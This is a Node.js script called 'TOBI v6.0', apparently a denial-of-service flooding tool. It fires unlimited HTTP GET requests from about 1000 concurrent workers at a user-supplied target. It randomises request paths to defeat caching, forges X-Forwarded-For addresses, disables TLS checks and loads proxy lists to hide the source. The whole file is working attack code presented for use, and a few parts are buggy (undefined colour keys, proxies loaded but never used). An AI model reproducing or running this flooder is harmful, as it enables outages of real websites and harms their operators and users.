#!/usr/bin/env node

/**
 * TOBI v6.0 – Fast Launch Edition
 * Workers start instantly – same speed as MegaMedusa
 */

const https = require('https');
const http = require('http');
const crypto = require('crypto');
const fs = require('fs');
const readline = require('readline');

// ==================== COLORS ====================
const c = {
    red: '\x1b[91m', green: '\x1b[92m', yellow: '\x1b[93m',
    cyan: '\x1b[96m', bold: '\x1b[1m', reset: '\x1b[0m', clear: '\x1b[2J\x1b[H'
};

// ==================== GLOBAL VARIABLES (defined BEFORE use) ====================
let target = null;
let duration = 60;
let workers = 1000;
let rate = 0;
let proxyFile = null;
let proxies = [];
let proxyIndex = 0;
let stop = false;

let stats = {
    total: 0, success: 0, failed: 0,
    startTime: null, lastSec: 0, lastSecCount: 0, peakRps: 0
};

// ==================== PROXY LOADER ====================
function loadProxies() {
    if (!proxyFile) return;
    try {
        const content = fs.readFileSync(proxyFile, 'utf8');
        proxies = content.split('\n').filter(l => l.trim() && !l.startsWith('#') && l.includes(':'));
        console.log(`${c.green}[✓] Loaded ${proxies.length} proxies${c.reset}`);
    } catch(e) {
        console.log(`${c.yellow}[!] No proxy file – running without proxies${c.reset}`);
    }
}

function getProxy() {
    if (proxies.length === 0) return null;
    proxyIndex = (proxyIndex + 1) % proxies.length;
    return proxies[proxyIndex];
}

// ==================== REQUEST FUNCTION ====================
function sendRequest(url, callback) {
    const parsed = new URL(url);
    const protocol = parsed.protocol === 'https:' ? https : http;
    const path = `/${crypto.randomBytes(8).toString('hex')}?t=${Date.now()}&r=${crypto.randomBytes(4).toString('hex')}`;
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*254)}`,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Connection': 'keep-alive'
    };
    const start = Date.now();
    const options = {
        hostname: parsed.hostname,
        port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
        path: path,
        method: 'GET',
        headers: headers,
        timeout: 10000,
        rejectUnauthorized: false
    };
    const req = protocol.request(options, (res) => {
        let body = '';
        res.on('data', () => {});
        res.on('end', () => {
            const elapsed = Date.now() - start;
            callback(res.statusCode >= 200 && res.statusCode < 400, res.statusCode, elapsed);
        });
    });
    req.on('error', () => callback(false, null, Date.now() - start));
    req.on('timeout', () => {
        req.destroy();
        callback(false, null, 10000);
    });
    req.end();
}

// ==================== WORKER (INSTANT LOOP) ====================
function worker() {
    if (stop) return;
    // Rate limiting (optional)
    if (rate > 0) {
        const now = Date.now();
        if (!worker.lastTime) worker.lastTime = now;
        const wait = (1000 / rate) - (now - worker.lastTime);
        if (wait > 0) {
            setTimeout(() => {
                worker.lastTime = Date.now();
                sendRequest(target, (success, code, time) => {
                    stats.total++;
                    if (success) stats.success++;
                    else stats.failed++;
                    const nowSec = Date.now() / 1000;
                    if (nowSec - stats.lastSec >= 1) {
                        if (stats.lastSecCount > stats.peakRps) stats.peakRps = stats.lastSecCount;
                        stats.lastSecCount = 0;
                        stats.lastSec = nowSec;
                    }
                    stats.lastSecCount++;
                    worker();
                });
            }, wait);
            return;
        }
        worker.lastTime = now;
    }
    sendRequest(target, (success, code, time) => {
        stats.total++;
        if (success) stats.success++;
        else stats.failed++;
        const nowSec = Date.now() / 1000;
        if (nowSec - stats.lastSec >= 1) {
            if (stats.lastSecCount > stats.peakRps) stats.peakRps = stats.lastSecCount;
            stats.lastSecCount = 0;
            stats.lastSec = nowSec;
        }
        stats.lastSecCount++;
        worker(); // immediately call next request
    });
}

// ==================== STATS DISPLAY ====================
function displayStats() {
    const elapsed = (Date.now() - stats.startTime) / 1000;
    const rps = stats.total / Math.max(elapsed, 0.1);
    const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
    process.stdout.write(`\r${c.cyan}RPS: ${c.bold}${rps.toFixed(1)}${c.reset} | ` +
        `${c.green}✓ ${stats.success.toLocaleString()}${c.reset} | ` +
        `${c.red}✗ ${stats.failed.toLocaleString()}${c.reset} | ` +
        `${c.yellow}${successRate.toFixed(1)}%${c.reset} | ` +
        `${c.dim}${elapsed.toFixed(0)}s${c.reset}`);
}

// ==================== MAIN ====================
async function start() {
    if (!target.startsWith('http')) target = 'https://' + target;
    console.log(c.clear);
    console.log(`${c.red}${c.bold}
╔══════════════════════════════════════════════════════════════════════════╗
║                              🔥 TOBI v6.0 🔥                             ║
║                      Fast Launch – Workers Instant                      ║
╚══════════════════════════════════════════════════════════════════════════╝${c.reset}`);
    console.log(`\n${c.green}[✓] Target: ${target}`);
    console.log(`[✓] Duration: ${duration}s`);
    console.log(`[✓] Workers: ${workers.toLocaleString()}`);
    console.log(`[✓] Rate/worker: ${rate === 0 ? 'UNLIMITED' : rate}`);
    if (proxyFile) loadProxies();
    console.log(`${c.reset}\n`);

    stats.startTime = Date.now();
    stats.lastSec = stats.startTime / 1000;

    // LAUNCH ALL WORKERS INSTANTLY – NO STAGGER
    console.log(`${c.yellow}[!] Launching ${workers} workers...${c.reset}`);
    for (let i = 0; i < workers; i++) {
        worker();
    }
    console.log(`${c.green}[✓] All workers launched!${c.reset}\n`);

    const interval = setInterval(displayStats, 1000);

    process.on('SIGINT', () => {
        console.log(`\n${c.yellow}[!] Shutting down...${c.reset}`);
        stop = true;
        setTimeout(() => {
            clearInterval(interval);
            const elapsed = (Date.now() - stats.startTime) / 1000;
            const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
            console.log(`\n${c.magenta}${c.bold}════════════════════════════════════════════════════════════════`);
            console.log(`                    FINAL REPORT`);
            console.log(`════════════════════════════════════════════════════════════════${c.reset}`);
            console.log(`  Total Requests:  ${stats.total.toLocaleString()}`);
            console.log(`  Successful:      ${stats.success.toLocaleString()}`);
            console.log(`  Failed:          ${stats.failed.toLocaleString()}`);
            console.log(`  Success Rate:    ${successRate.toFixed(2)}%`);
            console.log(`  Peak RPS:        ${stats.peakRps}`);
            console.log(`  Duration:        ${elapsed.toFixed(1)}s`);
            console.log(`${c.magenta}════════════════════════════════════════════════════════════════${c.reset}`);
            process.exit(0);
        }, 1000);
    });

    setTimeout(() => {
        stop = true;
    }, duration * 1000);
}

// ==================== INTERACTIVE INPUT ====================
(async () => {
    if (process.argv[2]) {
        target = process.argv[2];
        duration = parseInt(process.argv[3]) || 60;
        workers = parseInt(process.argv[4]) || 1000;
        rate = parseInt(process.argv[5]) || 0;
        proxyFile = process.argv[6] || null;
        start();
    } else {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        target = await new Promise(resolve => rl.question(`${c.cyan}🌐 Target URL: ${c.reset}`, resolve));
        duration = parseInt(await new Promise(resolve => rl.question(`${c.cyan}⏱️  Duration (seconds): ${c.reset}`, resolve))) || 60;
        workers = parseInt(await new Promise(resolve => rl.question(`${c.cyan}👥 Workers: ${c.reset}`, resolve))) || 1000;
        rate = parseInt(await new Promise(resolve => rl.question(`${c.cyan}🚦 Rate/worker (0=unlimited): ${c.reset}`, resolve))) || 0;
        const useProxy = await new Promise(resolve => rl.question(`${c.cyan}🔄 Use proxy file? (y/n): ${c.reset}`, resolve));
        if (useProxy.toLowerCase() === 'y') {
            proxyFile = await new Promise(resolve => rl.question(`${c.cyan}📁 Proxy file path: ${c.reset}`, resolve)) || 'proxy.txt';
        }
        rl.close();
        start();
    }
})();
